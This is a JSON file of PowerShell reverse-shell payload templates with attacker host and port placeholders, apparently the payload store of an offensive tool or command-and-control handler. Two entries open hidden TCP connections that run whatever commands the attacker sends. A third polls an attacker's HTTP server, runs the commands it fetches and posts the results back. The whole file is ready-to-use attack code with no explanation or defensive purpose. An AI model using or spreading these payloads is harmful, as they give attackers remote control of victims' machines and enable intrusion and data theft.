{
  "powershell#3": {
    "template": "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('{LHOST}',{LPORT});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"",
    "con": "tcp"
  },
  "powershell#2": {
    "template": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
    "con": "tcp"
  },
  "powerShellIEX_modified": {
    "template": "Start-Process -FilePath \"powershell.exe\" -ArgumentList \"-WindowStyle Hidden -Command `$s='{LHOST}:{LPORT}';`$i='14f30f27-650c00d7-fef40df7';`$p='http://';`$v=IRM -UseBasicParsing -Uri `$p`$s/14f30f27 -Headers @{`\"Authorization`\"=`$i};while (`$true){`$c=(IRM -UseBasicParsing -Uri `$p`$s/650c00d7 -Headers @{`\"Authorization`\"=`$i});if (`$c -ne 'None') {`$r=IEX `$c -ErrorAction Stop -ErrorVariable e;`$r=Out-String -InputObject `$r;`$t=IRM -Uri `$p`$s/fef40df7 -Method POST -Headers @{`\"Authorization`\"=`$i} -Body ([System.Text.Encoding]::UTF8.GetBytes(`$e+`$r) -join ' ')}; sleep 0.8}\" -WindowStyle Hidden",
    "con": "http"
  }
}